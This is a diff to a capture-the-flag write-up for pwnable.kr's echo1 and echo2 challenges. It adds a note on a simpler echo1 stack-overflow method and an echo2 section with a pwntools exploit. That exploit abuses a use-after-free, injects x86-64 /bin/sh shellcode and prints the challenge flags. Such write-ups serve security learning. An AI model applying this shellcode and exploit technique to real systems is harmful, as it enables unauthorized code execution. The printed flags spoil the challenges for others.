@@ -146,11 +146,39 @@ p.sendline(payload)
 p.recvlines(2)
 p.interactive()
 ```
+Note: there is easier method to solve this problem just do "A"*40+pack(ret_addr)+shellcode and jmp %rsp
 
 ##### flag : H4d_som3_fun_w1th_ech0_ov3rfl0w
 		
+#### echo2
 
+This problem had UAF and format string bug , but i opted for UAF and  overwrite greetings func with .bss section containing shellcode luckily the heap addr is stored in rax , just manipulate it and  jump to our shellcode !!!
 
+```python
+from pwn import * 
+context.bits = 64
+id_ = 0x6020a0
+shellcode =     "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+#p = process('./echo2')
+p = remote('pwnable.kr',9011)
+p.recvuntil(':')
+payload = "\x04\x30\xFF\xE0"+"A"*10
+p.sendline(payload)
+p.recvuntil('>')
+p.sendline('4')
+p.recvuntil(')')
+p.sendline('n')
+p.recvuntil('>')
+p.sendline('3')
+p.recvline()
+payload = "\x90"+shellcode+pack(id_)
+p.sendline(payload)
+p.recvline()
+p.recvuntil('>')
+p.sendline('3')
+p.interactive()
+```
+##### flag : fun_with_UAF_and_FSB :)
 
 
 
